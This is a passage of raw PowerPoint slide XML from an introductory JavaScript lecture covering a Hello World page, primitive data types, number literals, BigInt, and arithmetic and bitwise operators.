              <a:t>&lt;!DOCTYPE</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html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800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;html&gt;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head</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meta</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charset</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"utf-8"</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title</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Interactive </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Hello</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> World</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title</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meta</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viewport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content</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width</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device-width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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initial-scale</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=1"</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function</a:t>
            </a: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sayHello</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getElementById</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id_name</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getElementById</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result</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innerHTML</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Hello</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> "</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head</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body</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id_name</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Your</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text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id_name</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size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"40"</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autofocus</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button</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onclick</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sayHello</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Say</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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Hello</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/&gt;&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</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&lt;output</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result</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&gt;&lt;/output&gt;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body</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800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1200" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B06090202040302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tsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{944B1DD9-0393-4236-8D98-A64706F22AAD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>JavaScript Data Types</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C987D5E7-B196-4024-9B26-1200F86A4CC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="982663" y="1600200"/>
            <a:ext cx="10599737" cy="5043488"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>7 primitive types:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Number 	IEEE 64-bit double precision floating point</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Boolean	true or false</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>String		</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Unicode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> text string</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>null		unknown value</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>undefined	unassigned value</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>Symbol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>		unique identifier (ES6)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>BigInt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>		unlimited precision integer (ES 2020)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>OOP objects with properties and methods</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>can be used and defined like dictionary in Python</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>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EAC3F29-C8E8-43F4-A753-3C26AFA1BD96}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Undefined</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21507" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F5BFDC6D-2D1A-42B9-A2AC-3D0D2F0A9EF0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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t</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t</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undefined</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"Undefined value!"</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t</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 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">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just for demonstration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="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x is undefined</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console</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log</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"Undefined value!"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="fi-FI"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tsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0CEA3870-7B8A-4EFD-A48A-FD547CF0DDF3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Numbers</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{186253A6-A5EC-45B0-A83E-6160548FD735}"/>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sz="2800" dirty="0"/>
              <a:t>All JavaScript numbers are always expressed as double precision 64-bit IEEE floating point numbers. There are no integers (except ES 2020 brought us </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>BigInts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>!).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>numerical range ±1.79769x10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" baseline="30000" dirty="0"/>
              <a:t>308</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Numerical integer constants which begin with 0o or 0O (zero O) are treated as octal (8-base numbers) e.g. 0o12 (012 will also work outside strict mode, but its use is not recommended)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Numerical constants beginning with 0x or 0X are treated as hexadecimal (16-base) e.g. 0xA0 = 160  0X20 = 32</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Numerical constants beginning with 0b or 0B are treated as binary (2-base) e.g. 0b101 = 5 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>E or e can be used to denote raising to the power of 10 e.g. 3e5 = 300000 123.4e-4 = 0.01234 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>The digit behind comma can be omitted e.g. 2. = 2.0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pP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AD47395-4DAD-4CB2-B0F9-8EDD3B66BFFF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0" err="1"/>
              <a:t>BigInt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0"/>
              <a:t> (ES 2020)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9D69DE77-CF0B-4156-B10C-8672606BC187}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>BigInt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> is a built-in object that provides a way to represent whole numbers larger than 2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" baseline="30000" dirty="0"/>
              <a:t>53</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> - 1.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>BigInt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> can be used for arbitrarily large integers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>BigInt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> is created by appending n to the end of an integer literal — 10n — or by calling the function </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>BigInt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>().</a:t>
            </a:r>
          </a:p>
          <a:p>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123456789012345678n;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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BigInt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("1234567890123456789");</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x = 2n**100n;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>BigInt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> is similar to Number in some ways, but it cannot be used with methods in the built-in Math object and cannot be mixed with instances of Number in operations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="fi-FI" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2228172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tsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{85E2F6BB-EC4C-4219-9415-A8229BBE6C50}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Arithmetic Operators</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{51830213-C005-4F56-B115-01D98CCA1945}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1600200"/>
            <a:ext cx="8229600" cy="4972050"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>+	add				2+2	= 4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-	subtract			2-1	= 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>*	multiply			3*2	= 6</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/	divide			3/2	= 1.5</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>%	modulo (remainder)	3%2	= 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>+	unary plus			+2	= 2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>- 	unary minus		-2	= -2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>++	increment by one	a = 3; b = a++; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>--	decrement by one	a = 2; b = --a;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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{864ACDD5-45ED-4067-A06A-0D9D8CEBE07E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Bitwise Operators</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{518B2430-E4BD-46B6-8B8E-6DE3596F2508}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&amp;		bitwise AND	3 &amp; 6		= 2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>|		bitwise OR		3 | 6 		= 7</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>^		bitwise XOR	3 ^ 6 		= 5</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>~		bitwise NOT	~3		= -4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
